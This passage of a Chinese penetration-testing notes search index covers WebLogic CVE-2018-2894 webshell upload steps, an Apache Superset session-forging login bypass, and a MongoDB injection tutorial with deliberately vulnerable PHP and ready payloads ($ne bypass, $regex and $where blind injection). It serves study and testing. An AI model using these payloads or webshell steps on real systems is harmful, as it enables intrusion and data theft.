\u5f71\u54cd\u7248\u672c Oracle WebLogic Server\uff0c\u7248\u672c10.3.6.0\uff0c12.1.3.0\uff0c12.2.1.2\uff0c12.2.1.3\u3002 \u524d\u63d0\u6761\u4ef6:\u7ba1\u7406\u5458\u5728\u540e\u53f0 ->base_domain->\u914d\u7f6e->\u4e00\u822c\u4fe1\u606f->\u9ad8\u7ea7\uff0c\u628a\u8fd9\u4e2a\u52fe\u9009\u4e86 \u5f00\u542f\u540e\u6211\u4eec\u6765\u5230 \uff0c\u628a\u8fd9\u4e2a\u6539\u4e3a \u8def\u5f84 /user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css \u7136\u540e\u70b9\u5b89\u5168\uff0c\u518d\u70b9\u6dfb\u52a0\uff0c\u628a\u6211\u4eec\u7684jsp\u9a6c\u4f20\u4e0a\u53bb \u6293\u5305\uff0c\u83b7\u53d6\u8be5\u6728\u9a6c\u7684\u65f6\u95f4\u6233 \u8bbf\u95ee http://123.57.137.109:7001/ws_utc/css/config/keystore/\u65f6\u95f4\u6233_\u6587\u4ef6\u540d \u6210\u529f\u8bbf\u95ee\u6211\u7684\u9a6c\u513f \u4fee\u590d: \u8bbe\u7f6eConfig.do \u3001begin.do\u9875\u9762\u767b\u5f55\u6388\u6743\u540e\u8bbf\u95ee ,\u5347\u7ea7\uff0c\u52a0waf","title":"Weblogic \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\uff08CVE-2018-2894\uff09"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%95%B0%E6%8D%AE%E5%BA%93/%E6%95%B0%E6%8D%AE%E5%BA%93/","text":"\u6570\u636e\u5e93 MongoDB \u6ce8\u5165 redis\u7684\u4e00\u4e9b\u653b\u51fb\u65b9\u5f0f sql\u6ce8\u5165 minio elastic search doris Apache superset Mongodb","title":"\u6570\u636e\u5e93"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%95%B0%E6%8D%AE%E5%BA%93/%E6%95%B0%E6%8D%AE%E5%BA%93/#_1","text":"MongoDB \u6ce8\u5165 redis\u7684\u4e00\u4e9b\u653b\u51fb\u65b9\u5f0f sql\u6ce8\u5165 minio elastic search doris Apache superset Mongodb","title":"\u6570\u636e\u5e93"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%95%B0%E6%8D%AE%E5%BA%93/Apache%20superset/Apache%20superset/","text":"Apache superset \u76ee\u5f55 \u767b\u5f55\u7ed5\u8fc7 cve-2023-27524 \u6570\u636e\u5e93\u53ef\u89c6\u5316 \u767b\u5f55\u7ed5\u8fc7 cve-2023-27524 https://github.com/horizon3ai/CVE-2023-27524 \u8fd0\u884c\uff0c\u62ff\u5230session \u7136\u540e\u628acookie\u91ccsession\u5b57\u6bb5\u6362\u6210\u811a\u672c\u7ed9\u7684session\u5373\u53ef\u767b\u5f55\u8fdb\u540e\u53f0","title":"Apache superset"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%95%B0%E6%8D%AE%E5%BA%93/Apache%20superset/Apache%20superset/#apache-superset","text":"","title":"Apache superset"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%95%B0%E6%8D%AE%E5%BA%93/Apache%20superset/Apache%20superset/#_1","text":"\u767b\u5f55\u7ed5\u8fc7 cve-2023-27524 \u6570\u636e\u5e93\u53ef\u89c6\u5316","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%95%B0%E6%8D%AE%E5%BA%93/Apache%20superset/Apache%20superset/#cve-2023-27524","text":"https://github.com/horizon3ai/CVE-2023-27524 \u8fd0\u884c\uff0c\u62ff\u5230session \u7136\u540e\u628acookie\u91ccsession\u5b57\u6bb5\u6362\u6210\u811a\u672c\u7ed9\u7684session\u5373\u53ef\u767b\u5f55\u8fdb\u540e\u53f0","title":"\u767b\u5f55\u7ed5\u8fc7 cve-2023-27524"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%95%B0%E6%8D%AE%E5%BA%93/MongoDB%20%E6%B3%A8%E5%85%A5/MongoDB%20%E6%B3%A8%E5%85%A5/","text":"MongoDB \u6ce8\u5165 \u76ee\u5f55 Nosql MongoDB \u57fa\u672c\u6982\u5ff5 \u6570\u636e\u5e93\u64cd\u4f5c \u96c6\u5408\u64cd\u4f5c \u6587\u6863\u64cd\u4f5c MongoDB \u6ce8\u5165 MongoDB\u51fd\u6570\u6ce8\u5165 \u5b57\u7b26\u4e32\u62fc\u63a5 ref Nosql NoSQL(NoSQL = Not Only SQL )\uff0c\u610f\u5373\"\u4e0d\u4ec5\u4ec5\u662fSQL\"\u3002 \u4f20\u7edf\u6570\u636e\u5e93\u5982mysql\u5c31\u662f\u5173\u7cfb\u578b\u6570\u636e\u5e93\uff0c\u800c\u5982MongoDB\u5c31\u662f\u975e\u5173\u7cfb\u578b\u6570\u636e\u5e93\uff0c\u4e5f\u88ab\u53eb\u505aNosqL MongoDB MongoDB \u5c06\u6570\u636e\u5b58\u50a8\u4e3a\u4e00\u4e2a\u6587\u6863\uff0c\u6570\u636e\u7ed3\u6784\u7531\u952e\u503c(key=>value)\u5bf9\u7ec4\u6210\u3002MongoDB \u6587\u6863\u7c7b\u4f3c\u4e8e JSON \u5bf9\u8c61\u3002\u5b57\u6bb5\u503c\u53ef\u4ee5\u5305\u542b\u5176\u4ed6\u6587\u6863\uff0c\u6570\u7ec4\u53ca\u6587\u6863\u6570\u7ec4\u3002 \u57fa\u672c\u6982\u5ff5 \u4e0eSQL\u5bf9\u7167 SQL\u672f\u8bed/\u6982\u5ff5 MongoDB\u672f\u8bed/\u6982\u5ff5 \u89e3\u91ca/\u8bf4\u660e database database \u6570\u636e\u5e93 table collection \u6570\u636e\u5e93\u8868/\u96c6\u5408 row document \u6570\u636e\u8bb0\u5f55\u884c/\u6587\u6863 column field \u6570\u636e\u5b57\u6bb5/\u57df index index \u7d22\u5f15 table joins \u8868\u8fde\u63a5,MongoDB\u4e0d\u652f\u6301 primary key primary key \u4e3b\u952e,MongoDB\u81ea\u52a8\u5c06_id\u5b57\u6bb5\u8bbe\u7f6e\u4e3a\u4e3b\u952e \u6570\u636e\u5e93\u64cd\u4f5c db \u67e5\u770b\u5f53\u524d\u6570\u636e\u5e93 show dbs \u67e5\u770b\u6240\u6709\u6570\u636e\u5e93 use db_name \u4f7f\u7528\u67d0\u6570\u636e\u5e93 \u521b\u5efa\u6570\u636e\u5e93 use new_db_name \u5982\u679c\u6570\u636e\u5e93\u4e0d\u5b58\u5728\uff0c\u5219\u521b\u5efa\u6570\u636e\u5e93\uff0c\u5426\u5219\u5207\u6362\u5230\u6307\u5b9a\u6570\u636e\u5e93 db.new_db_name.insert({\"xxx\":\"xxx}) \u8981\u663e\u793a\u6b64\u65b0\u6570\u636e\u5e93\uff0c\u6211\u4eec\u9700\u8981\u5411new_db_name \u6570\u636e\u5e93\u63d2\u5165\u4e00\u4e9b\u6570\u636e\u3002 \u5220\u9664\u6570\u636e\u5e93 db.dropDatabase() \u96c6\u5408\u64cd\u4f5c db.createCollection(name,option) \u521b\u5efa\u96c6\u5408\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u9644\u52a0\u53c2\u6570 db.collection_name.drop() \u5220\u9664\u96c6\u5408 \u6587\u6863\u64cd\u4f5c \u63d2\u5165\u6587\u6863 db.COLLECTION_NAME.insert({\"xx\":\"x\"}) \u6216 db.COLLECTION_NAME.save({\"xx\":\"x\"}) \u67e5\u8be2\u6587\u6863 db.collection.find(query, projection) query \uff1a\u53ef\u9009\uff0c\u4f7f\u7528\u67e5\u8be2\u64cd\u4f5c\u7b26\u6307\u5b9a\u67e5\u8be2\u6761\u4ef6 projection \uff1a\u53ef\u9009\uff0c\u4f7f\u7528\u6295\u5f71\u64cd\u4f5c\u7b26\u6307\u5b9a\u8fd4\u56de\u7684\u952e\u3002\u67e5\u8be2\u65f6\u8fd4\u56de\u6587\u6863\u4e2d\u6240\u6709\u952e\u503c\uff0c \u53ea\u9700\u7701\u7565\u8be5\u53c2\u6570\u5373\u53ef\uff08\u9ed8\u8ba4\u7701\u7565\uff09 \u66f4\u65b0\u6587\u6863 db.collection.update( <query>, <update>, { upsert: <boolean>, multi: <boolean>, writeConcern: <document> } ) query : update\u7684\u67e5\u8be2\u6761\u4ef6\uff0c\u7c7b\u4f3csql update\u67e5\u8be2\u5185where\u540e\u9762\u7684\u3002 update : update\u7684\u5bf9\u8c61\u548c\u4e00\u4e9b\u66f4\u65b0\u7684\u64cd\u4f5c\u7b26\uff08\u5982$,$inc...\uff09\u7b49\uff0c\u4e5f\u53ef\u4ee5\u7406\u89e3\u4e3asql update\u67e5\u8be2\u5185set\u540e\u9762\u7684 upsert : \u53ef\u9009\uff0c\u8fd9\u4e2a\u53c2\u6570\u7684\u610f\u601d\u662f\uff0c\u5982\u679c\u4e0d\u5b58\u5728update\u7684\u8bb0\u5f55\uff0c\u662f\u5426\u63d2\u5165objNew,true\u4e3a\u63d2\u5165\uff0c\u9ed8\u8ba4\u662ffalse\uff0c\u4e0d\u63d2\u5165\u3002 multi : \u53ef\u9009\uff0cmongodb \u9ed8\u8ba4\u662ffalse,\u53ea\u66f4\u65b0\u627e\u5230\u7684\u7b2c\u4e00\u6761\u8bb0\u5f55\uff0c\u5982\u679c\u8fd9\u4e2a\u53c2\u6570\u4e3atrue,\u5c31\u628a\u6309\u6761\u4ef6\u67e5\u51fa\u6765\u591a\u6761\u8bb0\u5f55\u5168\u90e8\u66f4\u65b0\u3002 writeConcern :\u53ef\u9009\uff0c\u629b\u51fa\u5f02\u5e38\u7684\u7ea7\u522b\u3002 \u5220\u9664\u6587\u6863 db.collection.remove( <query>, <justOne> ) query :\uff08\u53ef\u9009\uff09\u5220\u9664\u7684\u6587\u6863\u7684\u6761\u4ef6\u3002 justOne : \uff08\u53ef\u9009\uff09\u5982\u679c\u8bbe\u4e3a true \u6216 1\uff0c\u5219\u53ea\u5220\u9664\u4e00\u4e2a\u6587\u6863\uff0c\u5982\u679c\u4e0d\u8bbe\u7f6e\u8be5\u53c2\u6570\uff0c\u6216\u4f7f\u7528\u9ed8\u8ba4\u503c false\uff0c\u5219\u5220\u9664\u6240\u6709\u5339\u914d\u6761\u4ef6\u7684\u6587\u6863\u3002 MongoDB \u6ce8\u5165 \u6240\u7528mongodb\u9a71\u52a8 \u6ce8\u5165\u6839\u636e\u4ee3\u7801\u548b\u5199\u5927\u6982\u6709\u4e24\u79cd\u60c5\u51b5 \u4e00\u4e2a\u662f\u4ee3\u7801\u91cc\u76f4\u63a5\u5199\u6b7b\u6570\u636e\u5e93\u64cd\u4f5c\u7684\u5b57\u7b26\u4e32\u7136\u540e\u6267\u884c #!php <?php $mongo = new mongoclient(); $db = $mongo->myinfo; //\u9009\u62e9\u6570\u636e\u5e93 $query = \"db.table.save({'newsid':1})\"; //\u589e $query = \"db.table.find({'newsid':1})\"; //\u67e5 $query = \"db.table.remove({'newsid':1})\"; //\u51cf $query = \"db.table.update({'newsid':1},{'newsid',2})\"; \u6539 $result = $db->execute($query); \u4e00\u4e2a\u662f\u4f7f\u7528MongoDB\u63d0\u4f9b\u7684\u65b9\u6cd5\u8fdb\u884c\u6570\u636e\u5e93\u64cd\u4f5c #!php <?php $mongo = new mongoclient(); $db = $mongo->myinfo; //\u9009\u62e9\u6570\u636e\u5e93 $coll = $db->test; //\u9009\u62e9\u96c6\u5408 $coll->save(); //\u589e $coll->find(); //\u67e5 $coll->remove(); //\u51cf $coll->update(); //\u6539 MongoDB\u51fd\u6570\u6ce8\u5165 \u6570\u7ec4\u7ed1\u5b9a\u6ce8\u5165 #!php <?php $mongo = new mongoclient(); $db = $mongo->myinfo; //\u9009\u62e9\u6570\u636e\u5e93 $coll = $db->test; //\u9009\u62e9\u96c6\u5408 $username = $_GET['username']; $password = $_GET['password']; $data = array( 'username'=>$username, 'password'=>$password ); $data = $coll->find($data); $count = $data->count(); if ($count>0) { foreach ($data as $user) { echo 'username:'.$user['username'].\"</br>\"; echo 'password:'.$user['password'].\"</br>\"; } } else{ echo '\u672a\u627e\u5230'; } ?> \u6b63\u5e38\u4e1a\u52a1\u903b\u8f91 url?username=tom&password=123456 \u6ce8\u5165 url?username[$ne]=xxxx&password[$ne]=xxxx \u8fd9\u4e2a\u53c2\u6570\u53d1\u8fc7\u53bb\u540e\uff0c\u591a\u7ef4\u6570\u7ec4\u89e3\u6790\u540e\uff0c\u4ee3\u7801\u5185\u90e8\u5c31\u662f\u8fd9\u4e2a\u60c5\u51b5 $data = array( 'username'=>array('$ne'=>\"xxxx\"), 'password'=>array('$ne'=>\"xxxx\") ); \u6267\u884c\u7684\u6570\u636e\u5e93\u8bed\u53e5\u5c31\u662f db.test.find({username:{'$ne':'xxxx'},password:{'$ne':'xxxx'}}); \u5c31\u662f\u67e5\u8be2test\u96c6\u5408\u4e2d\u7684 username\u4e0d\u4e3axxxx\uff0cpassword\u4e0d\u4e3axxxx\u7684\u7ed3\u679c\u3002\u6362\u800c\u8a00\u4e4b\u5c31\u662f\u67e5\u8be2test\u96c6\u5408\u4e2d\u6240\u6709\u6570\u636e \u76f8\u5f53\u4e8emysql\uff1aselect * from test where username!='test' and password!='test'; \u76f2\u6ce8\uff1a\u5229\u7528\u6b63\u5219 #!php <?php $mongo = new mongoclient(); $db = $mongo->myinfo; //\u9009\u62e9\u6570\u636e\u5e93 $coll = $db->test; //\u9009\u62e9\u96c6\u5408 $lock = $_POST['lock']; $key = $_POST['key']; if (is_array($lock)) { $data = array( 'lock'=>$lock); $data = $coll->find($data); if ($data->count()>0) { echo 'the lock is right,but wrong key'; }else{ echo 'lock is wrong'; } }else{ if ($lock == 'aabbccdd'&&$key=='aabbccdd') { echo 'Your flag is xxxxxxx'; }else{ echo 'lock is wrong'; } } ?> payload key=1&lock[$regex]=^a key=1&lock[$regex]=^b key=1&lock[$regex]=^c ..... \u76f8\u5f53\u4e8e\uff1a db.test.find({lock:{'$regex':'^a'}}); db.test.find({lock:{'$regex':'^b'}}); db.test.find({lock:{'$regex':'^c'}}); db.test.find({lock:{'$regex':'^ca'}}); \u2026\u2026 \u2026\u2026 db.test.find({lock:{'$regex':'^aabbccdd'}}); \u5b57\u7b26\u4e32\u62fc\u63a5 #!php <?php $username = $_GET['username']; $password = $_GET['password']; $query = \"var data = db.test.findOne({username:'$username',password:'$password'});return data;\"; //$query = \"return db.test.findOne();\"; //echo $query; $mongo = new mongoclient(); $db = $mongo->myinfo; $data = $db->execute($query); if ($data['ok'] == 1) { if ($data['retval']!=NULL) { echo 'username:'.$data['retval']['username'].\"</br>\"; echo 'password:'.$data['retval']['password'].\"</br>\"; }else{ echo '\u672a\u627e\u5230'; } }else{ echo $data['errmsg']; } ?> \u672c\u8d28\u4e0a\u653b\u51fb\u624b\u6cd5\u8fd8\u662f\u5b57\u7b26\u62fc\u63a5\u7136\u540e\u52a0\u6ce8\u91ca\u7b26 http://127.0.0.1/1.php?username=test '});return {username:tojson(db.getCollectionNames()),password:2};//\\&password=test \u9ad8\u7248\u672c\u597d\u50cf\u4e0d\u80fd\u52a0\u6ce8\u91ca\u7b26\u4e86\uff0c\u90a3\u5c31\u4f7f\u7528\u95ed\u5408\u7684\u65b9\u6cd5\u5373\u53ef\u3002 \u8fd9\u4e2apayload\u662f\u76f2\u6ce8 http://127.0.0.1/1.php?username=test '});if (db.version() > \"0\") { sleep(10000); exit; }var b=({a:'1\\&password=test where\u6ce8\u5165 demo \u5728Mongdb\u4e2d\u53ef\u4ee5\u4f7f\u7528\\$where\u64cd\u4f5c\u7b26,\u76f8\u5f53\u4e8esql\u8bed\u53e5\u4e2d\u7684where\u9650\u5236\u8bed\u53e5,mongodb\u4e2d\u7684\\$where\u64cd\u4f5c\u7b26\u5e38\u5e38\u5f15\u5165\u4e00\u4e2ajs\u7684\u51fd\u6570\u6765\u4f5c\u4e3a\u9650\u5236\u6761\u4ef6\uff0c\u5f53js\u51fd\u6570\u4e2d\u7684\u5b57\u7b26\u4e32\u5b58\u5728\u672a\u8fc7\u6ee4\u7684\u7528\u6237\u8f93\u5165\u65f6\uff0c\u6ce8\u5165\u5c31\u4ea7\u751f\u4e86\u3002 #!php <?php $mongo = new mongoclient(); $db = $mongo->myinfo; //\u9009\u62e9\u6570\u636e\u5e93 $coll = $db->news; //\u9009\u62e9\u96c6\u5408 $news = $_GET['news']; $function = \"function() {if(this.news == '$news') return true}\"; echo $function; $result = $coll->find(array('$where'=>$function)); if ($result->count()>0) { echo '\u8be5\u65b0\u95fb\u5b58\u5728'; }else{ echo '\u8be5\u65b0\u95fb\u4e0d\u5b58\u5728'; } ?> \u672c\u8d28\u4e0a\u5c31\u76f8\u5f53\u4e8e select * from news where news='\\$news'\uff0c\u90a3\u5c31\u5b57\u7b26\u4e32\u62fc\u63a5\u5c31\u884c\u4e86\uff0c\u548cmysql\u6ce8\u5165\u5dee\u4e0d\u591a \u76f2\u6ce8payload http://127.0.0.1/3.php?news=test'%26%26db.getCollectionNames().length>0%26%26'1'=='1 http://127.0.0.1/3.php?news=test'%26%26db.getCollectionNames()[0][0]=='m'%26%26'1'=='1 http://127.0.0.1/3.php?news=test'%26%26tojson(db.user.find()[0])[0]==' {'%26%26'1'=='1 \u56e0\u4e3adb.user.find()\u8fd4\u56de\u7684\u4e0d\u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u65e0\u6cd5\u53d6\u51fa\u5b57\u7b26\u8fdb\u884c\u6bd4\u8f83\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06\u5b83\u8f6c\u5316\u6210\u4e00\u4e2ajson\u5b57\u7b26\u4e32\uff0c\u5c31\u53ef\u4ee5\u6bd4\u8f83\u4e86\u3002 \u9053\u7406\u8bb2\u660e\u767d\u4e86\uff0c\u5269\u4e0b\u7684\u90fd\u662f\u4f53\u529b\u6d3b\uff0c\u7528python\u6216\u8005php\u5199\u4e0b\u5c0f\u811a\u672c\u5c31\u80fd\u5b9e\u73b0\u81ea\u52a8\u5316\u3002 ref https://wooyun.js.org/drops/Mongodb\u6ce8\u5165\u653b\u51fb.html","title":"MongoDB \u6ce8\u5165"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%95%B0%E6%8D%AE%E5%BA%93/MongoDB%20%E6%B3%A8%E5%85%A5/MongoDB%20%E6%B3%A8%E5%85%A5/#mongodb","text":"","title":"MongoDB \u6ce8\u5165"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%95%B0%E6%8D%AE%E5%BA%93/MongoDB%20%E6%B3%A8%E5%85%A5/MongoDB%20%E6%B3%A8%E5%85%A5/#_1","text":"Nosql MongoDB \u57fa\u672c\u6982\u5ff5 \u6570\u636e\u5e93\u64cd\u4f5c \u96c6\u5408\u64cd\u4f5c \u6587\u6863\u64cd\u4f5c MongoDB \u6ce8\u5165 MongoDB\u51fd\u6570\u6ce8\u5165 \u5b57\u7b26\u4e32\u62fc\u63a5 ref","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%95%B0%E6%8D%AE%E5%BA%93/MongoDB%20%E6%B3%A8%E5%85%A5/MongoDB%20%E6%B3%A8%E5%85%A5/#nosql","text":"NoSQL(NoSQL = Not Only SQL )\uff0c\u610f\u5373\"\u4e0d\u4ec5\u4ec5\u662fSQL\"\u3002 \u4f20\u7edf\u6570\u636e\u5e93\u5982mysql\u5c31\u662f\u5173\u7cfb\u578b\u6570\u636e\u5e93\uff0c\u800c\u5982MongoDB\u5c31\u662f\u975e\u5173\u7cfb\u578b\u6570\u636e\u5e93\uff0c\u4e5f\u88ab\u53eb\u505aNosqL","title":"Nosql"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%95%B0%E6%8D%AE%E5%BA%93/MongoDB%20%E6%B3%A8%E5%85%A5/MongoDB%20%E6%B3%A8%E5%85%A5/#mongodb_1","text":"MongoDB \u5c06\u6570\u636e\u5b58\u50a8\u4e3a\u4e00\u4e2a\u6587\u6863\uff0c\u6570\u636e\u7ed3\u6784\u7531\u952e\u503c(key=>value)\u5bf9\u7ec4\u6210\u3002MongoDB \u6587\u6863\u7c7b\u4f3c\u4e8e JSON \u5bf9\u8c61\u3002\u5b57\u6bb5\u503c\u53ef\u4ee5\u5305\u542b\u5176\u4ed6\u6587\u6863\uff0c\u6570\u7ec4\u53ca\u6587\u6863\u6570\u7ec4\u3002","title":"MongoDB"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%95%B0%E6%8D%AE%E5%BA%93/MongoDB%20%E6%B3%A8%E5%85%A5/MongoDB%20%E6%B3%A8%E5%85%A5/#_2","text":"\u4e0eSQL\u5bf9\u7167 SQL\u672f\u8bed/\u6982\u5ff5 MongoDB\u672f\u8bed/\u6982\u5ff5 \u89e3\u91ca/\u8bf4\u660e database database \u6570\u636e\u5e93 table collection \u6570\u636e\u5e93\u8868/\u96c6\u5408 row document \u6570\u636e\u8bb0\u5f55\u884c/\u6587\u6863 column field \u6570\u636e\u5b57\u6bb5/\u57df index index \u7d22\u5f15 table joins \u8868\u8fde\u63a5,MongoDB\u4e0d\u652f\u6301 primary key primary key \u4e3b\u952e,MongoDB\u81ea\u52a8\u5c06_id\u5b57\u6bb5\u8bbe\u7f6e\u4e3a\u4e3b\u952e","title":"\u57fa\u672c\u6982\u5ff5"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%95%B0%E6%8D%AE%E5%BA%93/MongoDB%20%E6%B3%A8%E5%85%A5/MongoDB%20%E6%B3%A8%E5%85%A5/#_3","text":"db \u67e5\u770b\u5f53\u524d\u6570\u636e\u5e93 show dbs \u67e5\u770b\u6240\u6709\u6570\u636e\u5e93 use db_name \u4f7f\u7528\u67d0\u6570\u636e\u5e93 \u521b\u5efa\u6570\u636e\u5e93 use new_db_name \u5982\u679c\u6570\u636e\u5e93\u4e0d\u5b58\u5728\uff0c\u5219\u521b\u5efa\u6570\u636e\u5e93\uff0c\u5426\u5219\u5207\u6362\u5230\u6307\u5b9a\u6570\u636e\u5e93 db.new_db_name.insert({\"xxx\":\"xxx}) \u8981\u663e\u793a\u6b64\u65b0\u6570\u636e\u5e93\uff0c\u6211\u4eec\u9700\u8981\u5411new_db_name \u6570\u636e\u5e93\u63d2\u5165\u4e00\u4e9b\u6570\u636e\u3002 \u5220\u9664\u6570\u636e\u5e93 db.dropDatabase()","title":"\u6570\u636e\u5e93\u64cd\u4f5c"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%95%B0%E6%8D%AE%E5%BA%93/MongoDB%20%E6%B3%A8%E5%85%A5/MongoDB%20%E6%B3%A8%E5%85%A5/#_4","text":"db.createCollection(name,option) \u521b\u5efa\u96c6\u5408\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u9644\u52a0\u53c2\u6570 db.collection_name.drop() \u5220\u9664\u96c6\u5408","title":"\u96c6\u5408\u64cd\u4f5c"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%95%B0%E6%8D%AE%E5%BA%93/MongoDB%20%E6%B3%A8%E5%85%A5/MongoDB%20%E6%B3%A8%E5%85%A5/#_5","text":"\u63d2\u5165\u6587\u6863 db.COLLECTION_NAME.insert({\"xx\":\"x\"}) \u6216 db.COLLECTION_NAME.save({\"xx\":\"x\"}) \u67e5\u8be2\u6587\u6863 db.collection.find(query, projection) query \uff1a\u53ef\u9009\uff0c\u4f7f\u7528\u67e5\u8be2\u64cd\u4f5c\u7b26\u6307\u5b9a\u67e5\u8be2\u6761\u4ef6 projection \uff1a\u53ef\u9009\uff0c\u4f7f\u7528\u6295\u5f71\u64cd\u4f5c\u7b26\u6307\u5b9a\u8fd4\u56de\u7684\u952e\u3002\u67e5\u8be2\u65f6\u8fd4\u56de\u6587\u6863\u4e2d\u6240\u6709\u952e\u503c\uff0c \u53ea\u9700\u7701\u7565\u8be5\u53c2\u6570\u5373\u53ef\uff08\u9ed8\u8ba4\u7701\u7565\uff09 \u66f4\u65b0\u6587\u6863 db.collection.update( <query>, <update>, { upsert: <boolean>, multi: <boolean>, writeConcern: <document> } ) query : update\u7684\u67e5\u8be2\u6761\u4ef6\uff0c\u7c7b\u4f3csql update\u67e5\u8be2\u5185where\u540e\u9762\u7684\u3002 update : update\u7684\u5bf9\u8c61\u548c\u4e00\u4e9b\u66f4\u65b0\u7684\u64cd\u4f5c\u7b26\uff08\u5982$,$inc...\uff09\u7b49\uff0c\u4e5f\u53ef\u4ee5\u7406\u89e3\u4e3asql update\u67e5\u8be2\u5185set\u540e\u9762\u7684 upsert : \u53ef\u9009\uff0c\u8fd9\u4e2a\u53c2\u6570\u7684\u610f\u601d\u662f\uff0c\u5982\u679c\u4e0d\u5b58\u5728update\u7684\u8bb0\u5f55\uff0c\u662f\u5426\u63d2\u5165objNew,true\u4e3a\u63d2\u5165\uff0c\u9ed8\u8ba4\u662ffalse\uff0c\u4e0d\u63d2\u5165\u3002 multi : \u53ef\u9009\uff0cmongodb \u9ed8\u8ba4\u662ffalse,\u53ea\u66f4\u65b0\u627e\u5230\u7684\u7b2c\u4e00\u6761\u8bb0\u5f55\uff0c\u5982\u679c\u8fd9\u4e2a\u53c2\u6570\u4e3atrue,\u5c31\u628a\u6309\u6761\u4ef6\u67e5\u51fa\u6765\u591a\u6761\u8bb0\u5f55\u5168\u90e8\u66f4\u65b0\u3002 writeConcern :\u53ef\u9009\uff0c\u629b\u51fa\u5f02\u5e38\u7684\u7ea7\u522b\u3002 \u5220\u9664\u6587\u6863 db.collection.remove( <query>, <justOne> ) query :\uff08\u53ef\u9009\uff09\u5220\u9664\u7684\u6587\u6863\u7684\u6761\u4ef6\u3002 justOne : \uff08\u53ef\u9009\uff09\u5982\u679c\u8bbe\u4e3a true \u6216 1\uff0c\u5219\u53ea\u5220\u9664\u4e00\u4e2a\u6587\u6863\uff0c\u5982\u679c\u4e0d\u8bbe\u7f6e\u8be5\u53c2\u6570\uff0c\u6216\u4f7f\u7528\u9ed8\u8ba4\u503c false\uff0c\u5219\u5220\u9664\u6240\u6709\u5339\u914d\u6761\u4ef6\u7684\u6587\u6863\u3002","title":"\u6587\u6863\u64cd\u4f5c"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%95%B0%E6%8D%AE%E5%BA%93/MongoDB%20%E6%B3%A8%E5%85%A5/MongoDB%20%E6%B3%A8%E5%85%A5/#mongodb_2","text":"\u6240\u7528mongodb\u9a71\u52a8 \u6ce8\u5165\u6839\u636e\u4ee3\u7801\u548b\u5199\u5927\u6982\u6709\u4e24\u79cd\u60c5\u51b5 \u4e00\u4e2a\u662f\u4ee3\u7801\u91cc\u76f4\u63a5\u5199\u6b7b\u6570\u636e\u5e93\u64cd\u4f5c\u7684\u5b57\u7b26\u4e32\u7136\u540e\u6267\u884c #!php <?php $mongo = new mongoclient(); $db = $mongo->myinfo; //\u9009\u62e9\u6570\u636e\u5e93 $query = \"db.table.save({'newsid':1})\"; //\u589e $query = \"db.table.find({'newsid':1})\"; //\u67e5 $query = \"db.table.remove({'newsid':1})\"; //\u51cf $query = \"db.table.update({'newsid':1},{'newsid',2})\"; \u6539 $result = $db->execute($query); \u4e00\u4e2a\u662f\u4f7f\u7528MongoDB\u63d0\u4f9b\u7684\u65b9\u6cd5\u8fdb\u884c\u6570\u636e\u5e93\u64cd\u4f5c #!php <?php $mongo = new mongoclient(); $db = $mongo->myinfo; //\u9009\u62e9\u6570\u636e\u5e93 $coll = $db->test; //\u9009\u62e9\u96c6\u5408 $coll->save(); //\u589e $coll->find(); //\u67e5 $coll->remove(); //\u51cf $coll->update(); //\u6539","title":"MongoDB \u6ce8\u5165"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E6%95%B0%E6%8D%AE%E5%BA%93/MongoDB%20%E6%B3%A8%E5%85%A5/MongoDB%20%E6%B3%A8%E5%85%A5/#mongodb_3","text":"\u6570\u7ec4\u7ed1\u5b9a\u6ce8\u5165 #!php <?php $mongo = new mongoclient(); $db = $mongo->myinfo; //\u9009\u62e9\u6570\u636e\u5e93 $coll = $db->test; //\u9009\u62e9\u96c6\u5408 $username = $_GET['username']; $password = $_GET['password']; $data = array( 'username'=>$username, 'password'=>$password ); $data = $coll->find($data); $count = $data->count(); if ($count>0) { foreach ($data as $user) { echo 'username:'.$user['username'].\"</br>\"; echo 'password:'.$user['password'].\"</br>\"; } } else{ echo '\u672a\u627e\u5230'; } ?> \u6b63\u5e38\u4e1a\u52a1\u903b\u8f91 url?username=tom&password=123456 \u6ce8\u5165 url?username[$ne]=xxxx&password[$ne]=xxxx 